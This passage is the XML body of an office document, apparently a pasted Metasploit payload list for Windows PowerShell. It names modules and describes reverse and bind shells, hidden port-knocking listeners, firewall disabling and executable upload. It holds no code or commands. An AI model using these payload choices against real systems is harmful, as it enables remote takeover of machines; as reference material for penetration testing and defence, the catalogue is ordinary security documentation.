      <text:p text:style-name="P1"><text:s text:c="37"/>lowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/reverse_tcp_dns <text:s text:c="6"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/reverse_tcp_rc4 <text:s text:c="6"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/reverse_tcp_rc4_dns <text:s text:c="2"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/patchupm <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>eterpreter/reverse_tcp_uuid <text:s text:c="5"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_hidden_ipknock_tcp <text:s text:c="8"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection. First, the por</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t will need to be knocked from</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the IP defined in KHOST. This I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>P will work as an authenticatio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n method (you can spoof it with</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>tools like hping). After that</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>you could get your shellcode fr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>om any IP. The socket will appe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ar as "closed," thus helping to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>hide the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_hidden_tcp <text:s text:c="16"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection from a hidden p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort and spawn a command shell t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_ipv6_tcp <text:s text:c="18"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_ipv6_tcp_uuid <text:s text:c="13"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_named_pipe <text:s text:c="16"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_nonx_tcp <text:s text:c="18"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_tcp <text:s text:c="23"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_tcp_rc4 <text:s text:c="19"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_tcp_uuid <text:s text:c="18"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/find_tag <text:s text:c="23"/>ommand via PowerShell. Use an e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>stablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_ipv6_tcp <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_named_pipe <text:s text:c="13"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>back to the attacker via a name</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_nonx_tcp <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_ord_tcp <text:s text:c="16"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp <text:s text:c="20"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp_allports <text:s text:c="11"/>ommand via PowerShell. Try to c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker, on</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>all possible ports (1-65535, s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>lowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp_dns <text:s text:c="16"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp_rc4 <text:s text:c="16"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp_rc4_dns <text:s text:c="12"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/peinject <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp_uuid <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/pingback <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_bind_tcp <text:s text:c="23"/>ommand via PowerShell. Open a s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ocket and report UUID when a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection is received (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/pingback <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_tcp <text:s text:c="20"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and report UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/powershe <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ll_bind_tcp <text:s text:c="21"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/powershe <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ll_reverse_tcp <text:s text:c="18"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/powershe <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ll_reverse_tcp_ssl <text:s text:c="14"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_hidden_ipknock_tcp <text:s text:c="11"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for a connection. First,</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the port will need to be knocke</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from the IP defined in KHOST.</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>This IP will work as an authen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tication method (you can spoof</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>it with tools like hping). Afte</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r that you could get your shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>code from any IP. The socket wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ll appear as "closed," thus hel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ping to hide the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_hidden_tcp <text:s text:c="19"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for a connection from a h</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>idden port and spawn a command</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shell to the allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_ipv6_tcp <text:s text:c="21"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for an IPv6 connection (W</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>indows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_ipv6_tcp_uuid <text:s text:c="16"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for an IPv6 connection wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>th UUID Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_named_pipe <text:s text:c="19"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for a pipe connection (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ndows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_nonx_tcp <text:s text:c="21"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for a connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tcp <text:s text:c="26"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for a connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tcp_rc4 <text:s text:c="22"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tcp_uuid <text:s text:c="21"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for a connection with UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/fi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tag <text:s text:c="26"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). U</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>se an established connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_ipv6_tcp <text:s text:c="18"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker ove</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>r IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_nonx_tcp <text:s text:c="18"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker (No</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_ord_tcp <text:s text:c="19"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp <text:s text:c="23"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp_allports <text:s text:c="14"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). T</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ry to connect back to the attac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ker, on all possible ports (1-6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>5535, slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp_dns <text:s text:c="19"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp_rc4 <text:s text:c="19"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp_rc4_dns <text:s text:c="15"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp_uuid <text:s text:c="18"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell/re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_udp <text:s text:c="23"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (staged). C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell_bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tcp <text:s text:c="26"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection and spawn a com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell_bi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tcp_xpfw <text:s text:c="21"/>ommand via PowerShell. Disable</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the Windows ICF, then listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection and spawn a comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>and shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell_hi <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>dden_bind_tcp <text:s text:c="19"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection from certain IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>and spawn a command shell. The</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shellcode will reply with a RS</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>T packet if the connections is</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>not coming from the IP defined</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>in AHOST. This way the port wil</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>l appear as "closed" helping us</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>to hide the shellcode.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/shell_re <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp <text:s text:c="23"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/speak_pw <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ned <text:s text:c="29"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_hidden_ipknock_tcp <text:s text:c="10"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Listen for a connection. F</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>irst, the port will need to be</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>knocked from the IP defined in</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>KHOST. This IP will work as an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>authentication method (you can</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>spoof it with tools like hping)</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>. After that you could get your</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shellcode from any IP. The soc</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ket will appear as "closed," th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>us helping to hide the shellcod</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_hidden_tcp <text:s text:c="18"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Listen for a connection fr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>om a hidden port and spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell to the allowed host</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_ipv6_tcp <text:s text:c="20"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Listen for an IPv6 connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ion (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_ipv6_tcp_uuid <text:s text:c="15"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Listen for an IPv6 connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ion with UUID Support (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_named_pipe <text:s text:c="18"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Listen for a pipe connecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>on (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/windows/powershell/upexec/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_nonx_tcp <text:s text:c="20"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Listen for a connection (N</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp <text:s text:c="25"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Listen for a connection (W</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>indows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp_rc4 <text:s text:c="21"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Listen for a connection</text:p>
